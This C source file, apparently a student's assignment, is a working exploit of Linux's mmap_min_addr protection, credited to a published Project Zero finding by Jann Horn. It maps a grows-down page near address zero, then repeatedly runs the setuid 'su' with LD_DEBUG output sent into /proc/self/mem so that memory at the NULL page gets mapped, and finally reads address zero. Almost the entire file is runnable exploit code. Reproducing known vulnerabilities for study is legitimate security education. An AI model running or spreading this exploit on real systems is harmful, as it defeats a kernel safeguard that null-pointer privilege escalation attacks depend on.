/*
 * Student ID: U201911803
 * Author: XuBiang 徐必昂
 *
 * Based on wonderful mmap_min_addr bypass by Jann Horn:
 *   https://bugs.chromium.org/p/project-zero/issues/detail?id=1792&desc=2
 */

#include <err.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

int main(void) {
    int ret = EXIT_FAILURE;
    char cmd[1000];

    void* map = mmap((void*)0x10000, 0x1000, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_FIXED, -1, 0);
    if (map == MAP_FAILED) {
        perror("[-] mmap failed");
        goto end;
    } else {
        printf("[+] mmap done\n");
    }

    int mem_fd = open("/proc/self/mem", O_RDWR);
    if (mem_fd == -1) {
        perror("[-] open mem failed");
        goto end;
    } else {
        printf("[+] open mem done\n");
    }

    unsigned long addr = (unsigned long)map;
    sprintf(cmd, "LD_DEBUG=help su 1>&%d", mem_fd);
    printf("[+] addr: \n");
    while (addr != 0) {
        printf("%lx -> ", addr);
        addr -= 0x1000;
        if (lseek(mem_fd, addr, SEEK_SET) == -1) {
            perror("[-] lseek failed");
            goto end;
        }
        system(cmd);
    }

    printf("%lx\n", addr);
    printf("[+] /proc/$PPID/maps:\n");
    system("head -n1 /proc/$PPID/maps");
    printf("[+] data at NULL: 0x%lx\n", *(unsigned long*)0);

end:
    if (mem_fd >= 0) {
        ret = close(mem_fd);
        if (ret != 0) { perror("[-] close mem_fd"); }
    }
    return ret;
}